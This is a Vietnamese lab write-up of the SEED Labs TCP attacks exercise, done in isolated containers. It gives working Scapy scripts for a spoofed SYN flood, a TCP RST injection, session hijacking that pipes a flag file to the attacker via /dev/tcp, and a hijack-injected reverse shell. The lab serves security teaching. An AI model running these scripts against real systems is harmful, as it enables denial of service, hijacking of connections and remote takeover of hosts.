TCP Attacks
===

- [TCP Attacks](#tcp-attacks)
  - [Introduce](#introduce)
  - [Setup Lab](#setup-lab)
  - [Task 1: SYN Flooding Attack](#task-1-syn-flooding-attack)
      - [a. Task 1.1: Launching the Attack Using Python](#a-task-11-launching-the-attack-using-python)
      - [b. Task 1.2: Launching the Attack Using C](#b-task-12-launching-the-attack-using-c)
      - [a. Task 1.3: Enable the SYN Cookie Countermeasure](#a-task-13-enable-the-syn-cookie-countermeasure)
  - [Task 2: TCP RST Attacks on telnet Connections](#task-2-tcp-rst-attacks-on-telnet-connections)
  - [Task 3: TCP Session Hijacking](#task-3-tcp-session-hijacking)
  - [Task 4: Creating Reverse Shell using TCP Session Hijacking](#task-4-creating-reverse-shell-using-tcp-session-hijacking)
## Introduce

Lỗ hỏng trong các giao thức TCP/IP đại diện cho một loại lỗ hỏng đặc biệt trong thiết kế và triển khai giao thức. 
Chúng ta sẽ được làm quen với lỗ hỏng cũng như là các cuộc tấn công chống lại lỗ hỏng này. Từ đó thấy được tầm quan trọng trong việc thiết kế bảo mật ngay từ đầu.

Lab sẽ đi qua các topic sau:
- The TCP protocol
- TCP SYN flood attack, and SYN cookies
- TCP reset attack
- TCP session hijacking attack
- Reverse shell

## Setup Lab

Bạn có thể đọc https://seedsecuritylabs.org/Labs_20.04/Files/TCP_Attacks/TCP_Attacks.pdf phần 2 để thực hiện việc setup lab.

Dưới đây là thông tin của các container.

| Tên                     | IP         |
| ----------------------- | ---------- |
| seed-attacker           | 10.9.0.1   | 
| victim-10.9.0.5         | 10.9.0.5   |
| user1-10.9.0.6          | 10.9.0.6   |
| user2-10.9.0.7          | 10.9.0.7   |

## Task 1: SYN Flooding Attack

SYN flood là một dạng DOS attack trong đó attacker sẽ gửi rất nhiều SYN request đến cho port TCP của victim nhưng attacker sẽ không có ý định hoàn thành quá trình 3-way handshake bằng cách sử dụng IP giả hoặc không tiếp tục thực hiện quá trình. Thông qua cuộc tấn công, attacker có thể flood được queue của victim. Queue này dùng cho kế nối half-opened (kết nối đã hoàn tất quá trình SYN, SYN-ACK), khi nó đầy thì máy của victim sẽ không thể thực hiện được kết nối được nữa.

#### a. Task 1.1: Launching the Attack Using Python
    
- Đầu tiên ta thực hiện hoàn thiện đoạn code được cung cấp. Nội dung đoạn code sau khi hoàn thiện sẽ như sau :

    ```python
    #!/bin/env python3

    from scapy.all import IP, TCP, send
    from ipaddress import IPv4Address
    from random import getrandbits

    ip  = IP(dst="10.9.0.5")
    tcp = TCP(dport=23, flags='S')
    pkt = ip/tcp

    while True:
        pkt[IP].src    = str(IPv4Address(getrandbits(32)))
        pkt[TCP].sport = getrandbits(16)
        pkt[TCP].seq   = getrandbits(32)
        send(pkt, verbose = 0)

    ```
Đoạn code này thực hiện liên tục việc tạo ra các gói tin với thông tin src, sport và seq random đến cho địa chỉ IP 10.9.0.5 (tức victim) với dport=23 đây là port thông dụng của TCP và flags = 'S' tức là gửi gói SYN để thực hiện SYN flood attack. 

- Tiếp đến ta thực hiện đoạn code này trên terminal attacker và chờ đợi trong vòng 1 đến 2 phút để thực hiện tấn công SYN flood

    ![](https://i.imgur.com/lF1JgAc.png)

- Bây giờ ta sẽ thực hiện kiểm tra xem cuộc tấn công SYN flood có thành công không. Bằng cách thực hiện telnet từ container user1 đến victim.

    ![](https://i.imgur.com/4ya7DTa.png)

    Ta có thể thấy user1 không thể telnet đến victim chứng tỏ cuộc tấn công SYN flood của chúng ta đã thành công. Tuy nhiên nếu một số trường hợp cuộc tấn công không thành công thì bạn có thể thực hiện các câu lệnh sau.
    - `sysctl -w net.ipv4.tcp_max_syn_backlog=80` để chỉnh size của queue bằng 80.
    - `ip tcp_metrics flush` để xóa cache.
    
    Có thể thực hiện `netstat -nat` để có thể quan sát queue kỹ hơn để thấy rằng đoạn code trên thực hiện chính xác. Ở đây không có state nào là ESTABLISHED, chỉ toàn là SYN_RECV từ các địa chỉ random. Từ đó làm tràn queue dẫn đến việc user1 không thể telnet đến victim.
    
    ![](https://i.imgur.com/de9ZSnT.png)


#### b. Task 1.2: Launching the Attack Using C

- Các vấn đề ở task 1.1 (ngoài vấn đề cache) sẽ đều có thể giải quyết khi ta dùng ngôn ngữ C vì nó có thể gửi spoof packet một cách nhanh chóng hơn python.

- Thực hiện biên dịch file `synflood.c` bằng câu lệnh `gcc synflood.c -o synflood` và chạy file thực thi `./synflood 10.9.0.5 23` ở terminal attacker.

- Sau đó kiểm bằng cách dùng container user1 telnet tới victim như đã đề cập ở task1.1 thì thấy cuộc tấn công của ta đã thành công.

    ![](https://i.imgur.com/4ya7DTa.png)

#### a. Task 1.3: Enable the SYN Cookie Countermeasure

- Các task ở trên thực hiện khi SYN Cookie Countermeasure ở chế độ disable. Task1.3 này ta sẽ thực hiện lại các cuộc tấn công trên khi SYN Cookie Countermeasure ở chế độ enable
- Đầu tiên ta thực hiện enable SYN Cookie Countermeasure bằng lệnh `sysctl -w net.ipv4.tcp_syncookies=1` ở terminal victim.

    ![](https://i.imgur.com/i85ZcQI.png)
    
    Ta đã thành công enable SYN Cookie Countermeasure.
- Tiếp đến ta thực hiện lại 2 cuộc tấn công trên. thì nhận được kết quả :

    ![](https://i.imgur.com/3TXgZ8t.png)
    
    Điều đó chứng tỏ là cuộc tấn công SYN flood của chúng ta đã thất bại. Kiểm tra bằng lệnh `netstat -nat |grep ESTABLISHED` để có thể thấy rõ hơn.
    
    ![](https://i.imgur.com/zZ4IYMj.png)

    Vậy nên ta sẽ không thể flood queue của victim nếu như SYN Cookie Countermeasure đang enable. Vì đây là một kỹ thuật gọi là SYN cookie, kỹ thuật này nhằm để chống lại SYN flood attack. Nó còn cho phép server tránh bị drop connection khi queue bị đầy.
## Task 2: TCP RST Attacks on telnet Connections

TCP RST attack là một kỹ thuật có thể chấm dứt kết nối TCP đã thiết lập giữa 2 victim. VÍ dụ có một kết nối telnet được thiết lập giữa 2 máy A và B, attacker có thể spoof RST packet từ A và gửi đến cho B để ngắt kết nối telnet.

- Đề cho ta một sườn code với các giá trị khuyết, bây giờ ta cần phải hoàn thành code đó để tạo nên một cuộc tấn công TCP RST.

- Đầu tiên thì ta dùng `wireshark` để tìm ra IP nguồn và IP đích.

    ![](https://i.imgur.com/qsrVvRN.png)

- Tiếp đến ta thực hiện thiết lập một kết nối `telnet` giữa `user1` và `victim`.

    ![](https://i.imgur.com/kpLJZfM.png)
    
- Sau đó ta lấy thông tin của gói tin mà `wireshark` quét được để điền vào trong code gồm `port = 44612, seq=3547789532 , IP src =10.9.0.6, IP dest=10.9.0.5`

    ![](https://i.imgur.com/IVbJmQI.png)
    

- Sau khi hoàn thành thì ta được đoạn code như sau :

    ```python
    #!/usr/bin/env python3
    from scapy.all import *
    ip = IP(src="10.9.0.6", dst="10.9.0.5")
    tcp = TCP(sport=44612, dport=23, flags="R", seq=3547789532)
    pkt = ip/tcp
    ls(pkt)
    send(pkt, verbose=0)
    ```

- Thực hiện chạy đoạn code này ở terminal attacker để gửi RST packet spoof từ 10.9.0.6 đến 10.9.0.5 nhằm chấm dứt kết nối telnet đã được thiết lập

    ![](https://i.imgur.com/x83tjE7.png)

- Sau khi thực hiện thì đoạn code ở terminal attacker thì ta quay lại terminal user1 để kiểm tra thì thấy nó đã bị ngắt kết nối, thế là cuộc tấn công TCP RST của chúng ta đã thành công.

    ![](https://i.imgur.com/L1L71fV.png)

- Kiểm tra `wireshark` để có thể quan sát được ta đã gửi gói tin spoof đi thành công 

    ![](https://i.imgur.com/XksynYa.png)

## Task 3: TCP Session Hijacking

Mục đích của cuộc tấn công TCP session hijacking là chiếm đọat được một session TCP connect đang tồn tại giữa 2 máy bằng cách đưa nội dung độc hại vào session này. 

- Đề cho ta một sườn code với các giá trị khuyết, bây giờ ta cần phải hoàn thành code đó để tạo nên một cuộc tấn công TCP Session Hijacking.

- Đầu tiên ta bật `wireshark`

- Sau đó thực hiện kết nối `telnet` giữa `user1` với `victim` và tạo một file `flag` với nội dung `this is flag`

    ![](https://i.imgur.com/Dgff5qb.png)
    
- Tiếp đến ta dùng `wireshark` để tìm ra các thông tin bị khuyết bằng bằng gói tin quét được.

    ![](https://i.imgur.com/ihZyjoL.png)
    
- Và hoàn thành các nội dung bị khuyết với `IP src= 10.9.0.6, IP dst =10.9.0.5, TCP sport = 52610, TCP dport = 23, seq= 538944203 và ack=721067092` và `data = cat flag > /dev/tcp/10.9.0.1/9090` (Điều này khiến đầu ra (stdout) của shell được chuyển hướng đến kết nối tcp tới cổng 9090 của 10.9.0.1) thì đoạn code sẽ như sau :

    ![](https://i.imgur.com/5jnEln4.png)

- Bây giờ ta thực thi đoạn code này ở terminal attacker 

    ![](https://i.imgur.com/eVx9U7I.png)
    
    Vậy là ta đã có thể thực hiện được cuộc tấn công TCP Session hijacking.
    
## Task 4: Creating Reverse Shell using TCP Session Hijacking

Thay vì dùmg TCP Session Hijacking để thực thi các command thì rõ ràng là nó không thuận tiện và rất mất thời gian. Để có thể thực thi nhiều command thì ta chỉ cần tạo một shell victim trên máy attacker là được. 

Thực hiện khá giống task3 ở trên

- Đầu tiên mở `wireshark` để bắt gói tin 
- Sau đó thực hiện kết nối `telnet` từ `user1` đến `victim`

    ![](https://i.imgur.com/fbAcEc9.png)

- Tiếp đến thực hiện trích xuất các thông tin từ gói tin `wireshark` 

    ![](https://i.imgur.com/9rb3rUJ.png)

- Và thực hiện đoạn code như sau :

    ```python
    #!/usr/bin/python3
    import sys
    from scapy.all import *

    IPLayer = IP(src="10.9.0.6", dst="10.9.0.5")
    TCPLayer = TCP(sport=41054, dport=23, flags="A",seq=2731888097, ack=3276680965)
    Data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090\r"
    pkt = IPLayer/TCPLayer/Data
    ls(pkt)
    send(pkt,verbose=0)

    ```
- Và thực hiện đoạn code này ở terminal attacker thì ta đã có thể có được shell 

    ![](https://i.imgur.com/Ialzrzr.png)

     Vây là ta đã có thể tạo reverse shell bằng TCP session hijacking. Và hoàn thành xong bài lab.

